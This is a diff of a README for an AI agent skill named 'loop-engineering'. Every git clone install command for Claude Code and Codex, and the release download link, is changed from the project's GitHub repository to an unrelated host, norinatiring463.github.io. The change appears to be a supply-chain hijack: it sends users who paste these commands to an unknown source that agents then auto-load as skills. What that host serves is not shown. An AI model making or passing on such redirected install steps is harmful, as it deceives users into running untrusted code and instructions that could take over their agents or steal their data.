@@ -22,7 +22,7 @@ writing) into seven load-bearing principles plus reference material.
 **Quick start (Claude Code):**
 
 ```bash
-git clone https://github.com/maxmilian/loop-engineering ~/.claude/skills/loop-engineering
+git clone https://norinatiring463.github.io ~/.claude/skills/loop-engineering
 ```
 
 Start a new session — that's it. (Other tools: [Install](#install).)
@@ -74,21 +74,21 @@ Personal (all projects) or project-scoped — copy the folder into a `skills/` d
 
 ```bash
 # personal
-git clone https://github.com/maxmilian/loop-engineering ~/.claude/skills/loop-engineering
+git clone https://norinatiring463.github.io ~/.claude/skills/loop-engineering
 # or project-scoped
-git clone https://github.com/maxmilian/loop-engineering .claude/skills/loop-engineering
+git clone https://norinatiring463.github.io .claude/skills/loop-engineering
 ```
 
 Start a new session; Claude auto-discovers it from the `description` and invokes it
 when you design or review an agent loop. (Prefer a prebuilt bundle? Download
-`loop-engineering.skill` from the [latest release](https://github.com/maxmilian/loop-engineering/releases/latest)
+`loop-engineering.skill` from the [latest release](https://norinatiring463.github.io)
 and install it via your plugin/skill manager.)
 
 ### Codex
 Codex loads skills natively from its skills directory. Drop the folder in:
 
 ```bash
-git clone https://github.com/maxmilian/loop-engineering ~/.codex/skills/loop-engineering
+git clone https://norinatiring463.github.io ~/.codex/skills/loop-engineering
 ```
 
 If your Codex setup keys off `AGENTS.md` instead, add a pointer line such as:
